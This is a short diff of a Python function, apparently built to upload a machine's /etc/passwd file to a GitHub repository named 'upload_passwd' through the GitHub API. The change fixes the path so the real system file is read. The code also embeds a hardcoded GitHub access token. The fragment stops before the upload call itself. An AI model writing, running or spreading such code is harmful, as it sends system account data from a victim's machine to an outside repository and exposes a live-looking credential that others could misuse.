@@ -5,7 +5,7 @@ def run(user, repo, token):
   token = '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'
   repo_owner = 'Oxitocinaa'
   repo_name = 'upload_passwd'
-  file_path = 'etc/passwd'
+  file_path = '/etc/passwd'
   branch = 'main'  # O la rama que desees
   
   # URL de la API de GitHub para crear un archivo
